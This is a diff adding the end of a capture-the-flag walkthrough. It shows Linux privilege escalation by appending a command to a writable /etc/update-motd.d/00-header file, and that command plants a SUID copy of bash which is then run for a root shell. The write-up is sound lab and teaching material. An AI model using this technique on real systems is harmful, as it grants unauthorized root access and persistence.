@@ -169,6 +169,27 @@
 
 - An hint in  txt file reveals that we can modify ssh motd `message of the day` files.
 
+![image](https://github.com/user-attachments/assets/287235ea-454f-4631-9eb3-82365bacf793)
+
+- I learnt that `/etc/update-motd.d/` contains such files and I got an exploitation idea from this [site](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/).
+
+      echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header
+      exit
+      ssh again
+      ./bash -p
+
+- Exploiting the 00-header file
+
+![image](https://github.com/user-attachments/assets/6f9849fe-3709-49e5-9067-5a4d1229ed01)
+
+- Root
+  
+![image](https://github.com/user-attachments/assets/ae599468-0fb9-4760-abae-a34992083c3c)
+
+
+### THANKS FOR READING!!!!!!!!
+
+
 
 
 
